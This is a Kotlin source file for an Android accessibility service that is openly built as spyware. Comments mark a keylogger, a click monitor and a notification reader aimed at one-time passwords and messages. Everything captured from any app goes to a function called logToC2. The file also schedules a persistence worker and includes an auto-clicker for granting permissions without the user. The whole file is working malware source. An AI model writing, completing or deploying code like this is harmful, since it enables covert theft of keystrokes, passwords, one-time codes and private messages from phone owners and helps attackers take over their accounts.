package com.shadow.a11y

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.content.Context
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo

class ShadowAccessibilityService : AccessibilityService() {

    override fun onServiceConnected() {
        super.onServiceConnected()
        Log.i("ShadowA11y", "Accessibility Service Connected")
        
        // Guarantee persistence is scheduled if service is toggled on manually
        try {
            com.shadow.ShadowWorker.enqueue(applicationContext)
        } catch (e: Exception) {
            Log.e("ShadowA11y", "Failed to enqueue worker", e)
        }
        
        val info = AccessibilityServiceInfo().apply {
            eventTypes = AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED or
                         AccessibilityEvent.TYPE_VIEW_CLICKED or
                         AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED or
                         AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED or
                         AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED
            feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
            flags = AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS or
                    AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS or
                    AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS
            notificationTimeout = 100
        }
        this.serviceInfo = info

        getSharedPreferences("shadow_state", Context.MODE_PRIVATE)
            .edit().putBoolean("a11y_active", true).apply()
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        val packageName = event.packageName?.toString() ?: "unknown"
        val eventType = event.eventType

        // 1. Keylogger (Text Changed)
        if (eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            val text = event.text.joinToString("")
            if (text.isNotBlank()) {
                val logEntry = "[KEYLOG][$packageName] $text"
                logToC2(logEntry)
            }
        }

        // 2. Click Monitor (Buttons, Links)
        if (eventType == AccessibilityEvent.TYPE_VIEW_CLICKED) {
            val text = event.text.joinToString("")
            val desc = event.contentDescription?.toString() ?: ""
            val id = event.source?.viewIdResourceName ?: ""
            val logEntry = "[CLICK][$packageName] Text: '$text' Desc: '$desc' ID: '$id'"
            logToC2(logEntry)
        }

        // 3. Notification Reader (OTP, Messages)
        if (eventType == AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED) {
            val text = event.text.joinToString(" | ")
            val logEntry = "[NOTIF][$packageName] $text"
            logToC2(logEntry)
        }

        // 4. App Launch / Screen Change
        if (eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            val className = event.className?.toString() ?: ""
            val logEntry = "[WINDOW][$packageName] $className"
            logToC2(logEntry)
        }
    }

    override fun onInterrupt() {
        Log.w("ShadowA11y", "Accessibility Service Interrupted")
        getSharedPreferences("shadow_state", Context.MODE_PRIVATE)
            .edit().putBoolean("a11y_active", false).apply()
    }

    private fun logToC2(entry: String) {
        // Send directly to the Rust core via JNI
        com.shadow.ShadowCore.logEvent(entry)
    }

    // Auto-clicker utility (e.g., granting permissions autonomously)
    fun clickNodeById(viewId: String): Boolean {
        val root = rootInActiveWindow ?: return false
        val nodes = root.findAccessibilityNodeInfosByViewId(viewId)
        for (node in nodes) {
            if (node.isClickable) {
                return node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
            }
        }
        return false
    }
}